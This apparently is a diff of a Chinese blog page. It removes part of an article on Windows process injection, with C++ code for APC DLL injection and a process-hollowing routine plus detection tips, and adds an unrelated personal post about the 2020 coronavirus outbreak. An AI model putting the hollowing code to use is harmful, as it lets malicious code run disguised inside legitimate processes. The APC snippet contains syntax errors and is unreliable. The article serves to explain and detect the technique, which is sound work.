-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DWORD ret;</span><br><span class="line"><span class="keyword">char</span> *DllName = <span class="string">&#x27;c:\\MyDll.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">PVOID param = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (param != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;</span><br><span class="line">  <span class="keyword">for</span> (DWORD p = <span class="number">0</span>; p &lt; NumberOfThreads; p ++) &#123;</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, ThreadId[p]);</span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InjectDll</span><span class="params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&#x27;kernel32.dll&#x27;</span>, <span class="string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p>
-<p>基本步骤如下：</p>
-<ol>
-<li>使用CREATE_SUSPENDED调用CreateProcessW创建进程</li>
-<li>使用ZwUnmapViewOfSection卸载进程空间中的原始代码</li>
-<li>使用VirtualAllocEx分配内存，确保分配区域可写可执行</li>
-<li>使用WriteProcessMemory在分配区域内写入恶意代码</li>
-<li>使用SetThreadContext设置线程内容为指定的恶意代码</li>
-<li>使用ResumeThread回复进程执行</li>
-</ol>
-<p>代码中用到PEB的结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dt nt!_PEB</span><br><span class="line">+0x000 InheritedAddressSpace : UChar</span><br><span class="line">+0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">+0x002 BeingDebugged : UChar</span><br><span class="line">+0x003 SpareBool : UChar</span><br><span class="line">+0x004 Mutant : Ptr32 Void</span><br><span class="line">+0x008 ImageBaseAddress : Ptr32 Void</span><br></pre></td></tr></table></figure>
-<p>示例代码：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InjectProcess</span><span class="params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> HANDLE hFile;</span><br><span class="line"> DWORD dwFileSize;    <span class="comment">//文件大小</span></span><br><span class="line"> IMAGE_DOS_HEADER DosHeader;</span><br><span class="line"> IMAGE_NT_HEADERS NtHeader;</span><br><span class="line"> PROCESS_INFORMATION pi;</span><br><span class="line"> STARTUPINFO si;</span><br><span class="line"> CONTEXT context;</span><br><span class="line"> PVOID ImageBase;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> ImageSize;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> BaseAddr;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> retByte = <span class="number">0</span>;</span><br><span class="line"> LONG offset;</span><br><span class="line"> HMODULE hNtDll=<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!hNtDll)</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="built_in">GetProcAddress</span>(hNtDll,<span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line"> <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(si));</span><br><span class="line"> <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(pi));</span><br><span class="line"> si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"></span><br><span class="line"> hFile = ::<span class="built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> &#125;</span><br><span class="line"> ::<span class="built_in">SetFilePointer</span>(hFile, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line"> dwFileSize = ::<span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"> LPBYTE pBuf = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"> <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, dwFileSize);</span><br><span class="line"> DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    ::<span class="built_in">ReadFile</span>( hFile</span><br><span class="line">        , pBuf</span><br><span class="line">        , dwFileSize</span><br><span class="line">        , &amp;dwNumberOfBytesRead</span><br><span class="line">        , <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="keyword">void</span> *)&amp;DosHeader,pBuf,<span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_DOS_HEADER));</span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="keyword">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS));</span><br><span class="line"> <span class="comment">//检查PE结构</span></span><br><span class="line"> <span class="comment">//以挂起方式进程</span></span><br><span class="line"> BOOL res = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>,VictimFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> &#123;</span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="comment">//如果调用失败</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="keyword">void</span> *)(context.Ebx + <span class="number">8</span>),&amp;BaseAddr,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>),<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (!BaseAddr)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//拆卸傀儡进程内存模块</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ZwUnmapViewOfSection</span>((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pi.hProcess,BaseAddr))</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  ImageBase = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, </span><br><span class="line">   (<span class="keyword">void</span> *)NtHeader.OptionalHeader.ImageBase,</span><br><span class="line">   NtHeader.OptionalHeader.SizeOfImage, </span><br><span class="line">   MEM_RESERVE|MEM_COMMIT, </span><br><span class="line">   PAGE_EXECUTE_READWRITE);  <span class="comment">//ImageBase 0x00400000</span></span><br><span class="line">  <span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag = <span class="built_in">GetLastError</span>();</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//替换傀儡进程内存数据</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag2 = <span class="built_in">GetLastError</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//DOS 头 + PE 头 + 区块表的总大小</span></span><br><span class="line">  <span class="comment">//定位到区块头</span></span><br><span class="line">  offset = DosHeader.e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS);</span><br><span class="line">  IMAGE_SECTION_HEADER secHeader;</span><br><span class="line">  WORD i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//定位到各个区块</span></span><br><span class="line">   ::<span class="built_in">CopyMemory</span>((<span class="keyword">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_SECTION_HEADER)],<span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_SECTION_HEADER));</span><br><span class="line">   <span class="built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);</span><br><span class="line">   <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="comment">//重置 执行文件入口</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="keyword">void</span> *)(context.Ebx + <span class="number">8</span>), </span><br><span class="line">   &amp;ImageBase,   <span class="comment">//4194304</span></span><br><span class="line">   <span class="number">4</span>, &amp;retByte);</span><br><span class="line">  context.Eax = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">  <span class="built_in">SetThreadContext</span>(pi.hThread,&amp;context);</span><br><span class="line">  <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"> ::<span class="built_in">CloseHandle</span>(hFile);  </span><br><span class="line"> <span class="keyword">delete</span>[] pBuf;</span><br><span class="line"> <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol>
-<li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li>
-<li>SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们<br>  关注的地方。但是输入法之类的正常程序也可能使用注入技术。</li>
-<li>CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作，<br>  后续从两个维度来进行检查</li>
-</ol>
-<h3 id="2-1-检查跨进程写入的数据"><a href="#2-1-检查跨进程写入的数据" class="headerlink" title="2.1 检查跨进程写入的数据"></a>2.1 检查跨进程写入的数据</h3><p>虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过<br>特征可以识别出来</p>
-<ol>
-<li>写入的数据是PE文件</li>
-<li>写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据)</li>
-<li>写入超长数据</li>
-</ol>
-<h3 id="2-2-检查线程代码执行部分地址"><a href="#2-2-检查线程代码执行部分地址" class="headerlink" title="2.2 检查线程代码执行部分地址"></a>2.2 检查线程代码执行部分地址</h3><p>检查代码地址是否在WriteProcessMemory写入的数据区域之内</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">Windows DLL Injection Basics</a></li>
-<li><a target="_blank" rel="noopener" href="http://blog.csdn.net/evi10r/article/details/6745138">使用异步过程调用（APC）实现模块注入</a></li>
-<li><a target="_blank" rel="noopener" href="http://bbs.pediy.com/showthread.php?t=99206">Ring3下WX方法结束微点2009</a></li>
-<li><a target="_blank" rel="noopener" href="http://blog.w4kfu.com/tag/duqu">New method of injection</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.i7s3curi7y.com/win32-code-injection-techniques">The Ultimate Win32 code injection Reference</a></li>
-</ul>
+          <p>整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。</p>
+<p>在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专业。很多人不太明白专业和非专业之间的差距，可以想象一下你和一 个围棋九段的人下围棋，怎么换到医学领域大家就都是专家了？</p>
+<p>我看到一个建议轻征不隔离，把资源让给重症者。</p>
+<p>大家觉得这个建议如何？提这个建议的人说，主要依据是死亡人不多。这个犯了几个错误， 第一，要看死亡率，而不是死亡人数，患病的人多了，自然死人的就多了。第二，根据我 有限的常识，病毒是会自适应性的进化的，感染的人多了，可能就会产生更nb 的变种了。</p>
+<p>这个事情主要还是相信国家，相信我们的祖国。我觉得这个事情一定会解决了，只是时间 和损失程度问题，一季度的gdp 肯定是受影响了，希望疫情快点过去，天佑中华！</p>
+<p>最后希望所有看到此文的，新年幸福安康！</p>
 
       
     </div>
